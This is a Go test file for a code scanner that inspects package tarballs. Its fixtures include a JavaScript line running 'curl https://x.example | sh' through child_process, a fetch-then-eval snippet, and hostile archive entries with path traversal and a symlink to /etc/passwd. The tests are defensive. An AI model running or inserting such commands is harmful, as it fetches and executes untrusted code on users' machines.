package codescan

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"strings"
	"testing"
)

type entry struct {
	name, body string
	typ        byte
	link       string
}

func tgz(t *testing.T, entries ...entry) []byte {
	t.Helper()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)
	for _, e := range entries {
		typ := e.typ
		if typ == 0 {
			typ = tar.TypeReg
		}
		h := &tar.Header{Name: e.name, Typeflag: typ, Mode: 0o644, Size: int64(len(e.body)), Linkname: e.link}
		if typ != tar.TypeReg {
			h.Size = 0
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if typ == tar.TypeReg {
			if _, err := tw.Write([]byte(e.body)); err != nil {
				t.Fatal(err)
			}
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gz.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

const evilJS = `require('child_process').execSync("curl https://x.example | sh")`

func TestTarballFindings(t *testing.T) {
	data := tgz(t,
		entry{name: "package/package.json", body: `{"name":"x"}`},
		entry{name: "package/lib/index.js", body: evilJS},
		entry{name: "package/README.md", body: evilJS},
	)
	got, err := Tarball(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Rule != "SI-CODE-001" || !strings.HasPrefix(got[0].Message, "lib/index.js") {
		t.Fatalf("got %+v", got)
	}
}

func TestTarballMatchesDirectoryScan(t *testing.T) {
	code := map[string]string{"index.js": evilJS, "a/b.cjs": `fetch(u).then(r => r.text()).then(t => eval(t))`, "c.mjs": "export default 1"}
	var entries []entry
	for name, body := range code {
		entries = append(entries, entry{name: "package/" + name, body: body})
	}
	fromTar, err := Tarball(bytes.NewReader(tgz(t, entries...)))
	if err != nil {
		t.Fatal(err)
	}
	fromDir := Package(pkgDir(t, code))
	if len(fromTar) != len(fromDir) || fromTar[0].Message != fromDir[0].Message {
		t.Fatalf("tarball %+v\ndirectory %+v", fromTar, fromDir)
	}
}

// Hostile archives: nothing is written to disk, odd entries are skipped.
func TestTarballHostileEntries(t *testing.T) {
	data := tgz(t,
		entry{name: "../../escape.js", body: evilJS},
		entry{name: "/abs/path.js", body: evilJS},
		entry{name: "package/link.js", typ: tar.TypeSymlink, link: "/etc/passwd"},
		entry{name: "package/hard.js", typ: tar.TypeLink, link: "package/x"},
		entry{name: "package/ok.js", body: "module.exports = 1"},
	)
	got, err := Tarball(bytes.NewReader(data))
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range got {
		if strings.Contains(f.Message, "escape") || strings.Contains(f.Message, "abs") {
			t.Fatalf("scanned an entry outside the package: %+v", f)
		}
	}
}

func TestTarballNotGzip(t *testing.T) {
	if _, err := Tarball(strings.NewReader("not a tarball")); err == nil {
		t.Fatal("expected an error")
	}
}
